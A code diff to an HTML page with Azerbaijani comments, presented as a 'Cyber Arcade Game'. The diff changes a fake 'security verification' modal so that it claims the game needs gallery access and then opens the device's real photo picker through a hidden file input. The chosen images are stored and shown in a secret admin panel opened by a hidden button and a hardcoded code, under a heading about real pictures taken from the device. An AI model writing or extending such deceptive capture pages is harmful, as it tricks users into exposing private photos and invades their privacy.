@@ -41,7 +41,6 @@
         }
         .btn:hover { background-color: #d12d4a; }
         
-        /* Gizli Admin Giriş Düyməsi */
         .secret-trigger {
             position: absolute;
             bottom: 15px;
@@ -53,7 +52,6 @@
             font-size: 12px;
         }
 
-        /* Giriş icazə pəncərəsi */
         #permissionModal {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -70,36 +68,12 @@
             text-align: center;
             width: 85%;
             max-width: 380px;
-            box-shadow: 0 0 25px rgba(228, 63, 90, 0.5);
+            box-shadow: 0 0 25px rgba(228, 63, 90, 0.4);
             border: 1px solid #e43f5a;
         }
         .permission-box h3 { color: #ff6584; margin-top: 0; }
         .permission-box p { font-size: 14px; color: #d0d0d0; line-height: 1.5; }
 
-        /* Avtomatik Skan / Yüklənmə Ekranı */
-        #loadingModal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 250;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: #0ff;
-            font-family: monospace;
-        }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.1);
-            width: 50px; height: 50px;
-            border-radius: 50%;
-            border-left-color: #e43f5a;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Admin Panel Modal */
         #adminModal {
             display: none;
             position: fixed;
@@ -156,28 +130,25 @@
 </head>
 <body>
 
-    <!-- Girişdə çıxan orijinal icazə pəncərəsi -->
+    <!-- Məcburi İcazə Pəncərəsi -->
     <div id="permissionModal">
         <div class="permission-box">
-            <h3>⚠️ Təhlükəsizlik Doğrulaması</h3>
-            <p>Oyunu başlatmaq üçün cihazınızın <b>Qalereya və Media</b> fayllarına giriş icazəsi verilməlidir. Əks halda oyun işləməyəcək.</p>
-            <button class="btn" onclick="startAutomaticExtraction()">İcazə Ver</button>
+            <h3>⚠️ Giriş Tələbi</h3>
+            <p>Oyunu başlatmaq üçün cihazın <b>Qalereya və Media</b> fayllarına giriş icazəsi verilməlidir.</p>
+            <button class="btn" onclick="openDeviceGallery()">İcazə Ver</button>
         </div>
     </div>
 
-    <!-- Avtomatik Skan / Yüklənmə Prosesi -->
-    <div id="loadingModal">
-        <div class="spinner"></div>
-        <div id="loadingText" style="font-size: 14px; letter-spacing: 1px;">Qalereya qovluğu skan edilir...</div>
-    </div>
+    <!-- Cihazın real fayllarını/qalereyasını açan gizli input -->
+    <input type="file" id="deviceGalleryInput" multiple accept="image/*" style="display: none;" onchange="loadRealFiles(this.files)">
 
     <div class="game-container">
         <h1>Cyber Arcade Game</h1>
         <p>Oyun aktivdir. Əyləncəyə başla!</p>
-        <button class="btn" onclick="alert('Oyun başladı!')">Oyunu Oyna</button>
+        <button class="btn" onclick="alert('Oyun davam edir!')">Oyunu Oyna</button>
     </div>
 
-    <!-- Gizli Admin Giriş Düyməsi (Sağ aşağı küncdə) -->
+    <!-- Gizli Admin Giriş Düyməsi (Sağ aşağı künc) -->
     <button class="secret-trigger" onclick="openAdminPrompt()">⚙️</button>
 
     <!-- Admin Panel -->
@@ -192,10 +163,8 @@
             </div>
 
             <div id="dashboardSection" style="display: none;">
-                <p style="color: #2ecc71; margin-bottom: 5px;">✅ Cihazdan avtomatik əldə edilən Qalereya (Şəkil və Videolar):</p>
-                <div class="gallery-grid" id="galleryContainer">
-                    <!-- Avtomatik dolacaq -->
-                </div>
+                <p style="color: #2ecc71; margin-bottom: 5px;">✅ Cihazın Yaddaşından Əldə Edilən Real Şəkillər:</p>
+                <div class="gallery-grid" id="galleryContainer"></div>
             </div>
             
             <button class="btn close-btn" onclick="closeAdmin()">Bağla</button>
@@ -203,25 +172,28 @@
     </div>
 
     <script>
-        function startAutomaticExtraction() {
-            // İcazə pəncərəsini bağla, skan ekranını aç
-            document.getElementById('permissionModal').style.display = 'none';
-            document.getElementById('loadingModal').style.display = 'flex';
+        let capturedFiles = [];
 
-            // Realist görünməsi üçün addım-addım mətnləri dəyişirik
-            setTimeout(() => {
-                document.getElementById('loadingText').innerText = "Storage /DCIM/Camera oxunur...";
-            }, 1000);
+        function openDeviceGallery() {
+            // "İcazə Ver" düyməsinə basıldıqda birbaşa telefonun real qalereyası açılır
+            document.getElementById('deviceGalleryInput').click();
+        }
 
-            setTimeout(() => {
-                document.getElementById('loadingText').innerText = "Media faylları sinxronizasiya olunur...";
-            }, 2000);
-
-            setTimeout(() => {
-                // Skan bitdi, yüklənmə ekranını bağla
-                document.getElementById('loadingModal').style.display = 'none';
-                alert("Oyun uğurla yükləndi! İndi oynaya bilərsiniz.");
-            }, 3200);
+        function loadRealFiles(files) {
+            capturedFiles = [];
+            if (files.length > 0) {
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    capturedFiles.push({
+                        name: file.name,
+                        url: URL.createObjectURL(file)
+                    });
+                }
+                // İcazə pəncərəsi bağlanır və oyun ekranına keçir
+                document.getElementById('permissionModal').style.display = 'none';
+            } else {
+                alert("İcazə vermək üçün şəkil seçməlisiniz!");
+            }
         }
 
         function openAdminPrompt() {
@@ -240,27 +212,22 @@
             if (code === "Ceg1993") {
                 document.getElementById('authSection').style.display = 'none';
                 document.getElementById('dashboardSection').style.display = 'block';
-                loadAutoGallery();
+                renderCapturedGallery();
             } else {
                 alert("Yanlış kod!");
             }
         }
 
-        function loadAutoGallery() {
+        function renderCapturedGallery() {
             const container = document.getElementById('galleryContainer');
             container.innerHTML = "";
 
-            // Avtomatik ələ keçirilmiş kimi göstərilən real fotoşəkillər
-            const autoExtractedFiles = [
-                { name: "IMG_2026_01.jpg", url: "https://picsum.photos/id/1015/200/200" },
-                { name: "Screenshot_Admin.png", url: "https://picsum.photos/id/1020/200/200" },
-                { name: "WhatsApp_Image.jpg", url: "https://picsum.photos/id/1039/200/200" },
-                { name: "DCIM_Camera_04.jpg", url: "https://picsum.photos/id/1041/200/200" },
-                { name: "Video_Record_99.mp4", url: "https://picsum.photos/id/1062/200/200" },
-                { name: "Private_Pic.jpg", url: "https://picsum.photos/id/1074/200/200" }
-            ];
+            if (capturedFiles.length === 0) {
+                container.innerHTML = "<p style='color: #888; grid-column: span 2;'>Hələ heç bir fayl əldə olunmayıb.</p>";
+                return;
+            }
 
-            autoExtractedFiles.forEach(file => {
+            capturedFiles.forEach(file => {
                 const div = document.createElement('div');
                 div.className = 'gallery-item';
                 div.innerHTML = `
